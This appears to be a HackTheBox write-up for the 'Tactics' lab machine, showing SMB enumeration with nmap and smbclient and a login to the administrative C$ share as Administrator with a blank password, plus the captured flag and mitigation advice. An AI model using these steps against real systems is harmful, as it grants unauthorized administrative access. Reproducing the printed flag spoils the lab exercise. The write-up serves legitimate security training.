# Tactics - HackTheBox Writeup

**Date:** 2026-04-13
**OS:** Windows
**IP Address:** 10.129.26.136
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Tactics**. This machine is part of the Starting Point (Tier 1) and focuses on SMB enumeration and misconfigured authentication.

*   **Initial Access:** Gained access to the system's files via SMB by logging in as the `Administrator` user with a blank password.
*   **Privilege Escalation:** Not required as initial access was granted with Administrator privileges.
*   **Key Learning Points:** 
    * SMB enumeration using `smbclient`.
    * Risks of blank passwords for administrative accounts.
    * Accessing administrative shares (`C$`, `ADMIN$`).

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 135 | msrpc | Microsoft Windows RPC | Standard RPC port |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn | NetBIOS session service |
| 445 | microsoft-ds | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds | SMB service |

**Nmap Command:**
```bash
nmap -sC -sV -oN nmap/Tactics -Pn 10.129.26.136
```

## 2.2. SMB Enumeration
The Nmap scan revealed that SMB (Service Message Block) is running on port 445. This is a common target on Windows machines for misconfigurations.

### Listing Shares
Attempting to list the available shares using `smbclient` without a password:

```bash
smbclient -L 10.129.26.136 -U Administrator
```

**Output:**
```text
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```
The listing indicates that administrative shares (`ADMIN$`, `C$`) are accessible, which usually requires administrative credentials. In this case, no password was required.

---

# 3. Initial Access (User & Root Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Misconfigured Authentication (Blank Administrator Password).
*   **Vector:** SMB Service (Port 445).

## 3.2. Exploitation Path
Since the `Administrator` account has no password, we can connect directly to the `C$` share (the root of the C: drive).

**Connection Command:**
```bash
smbclient \\\\10.129.26.136\\C$ -U Administrator
```

Once connected, I navigated to the Administrator's desktop to find the flag:

```bash
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> dir
  .                                  DR        0  Thu Apr 22 09:16:03 2021
  ..                                 DR        0  Thu Apr 22 09:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 17:23:32 2021
  flag.txt                            A       32  Fri Apr 23 11:39:00 2021

smb: \Users\Administrator\Desktop\> get flag.txt
```

**Flag:**
```bash
cat flag.txt
# f751c19eda8f61ce81827e6930a1f40c
```

---

# 4. Privilege Escalation
Privilege escalation was not necessary for this machine as the initial entry point was already the `Administrator` account, providing full system access.

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| Administrator | [BLANK] | SMB Authentication |

---

# 6. Recommendations & Mitigation
1. **Enforce Strong Password Policies:** Ensure that all accounts, especially administrative ones, have complex passwords.
2. **Disable Unnecessary Shares:** If administrative shares like `C$` or `ADMIN$` are not required for remote management, they should be disabled or restricted to specific IP ranges.
3. **Disable Guest/Anonymous Access:** Ensure that SMB does not allow anonymous listing or login with default accounts without proper authentication.


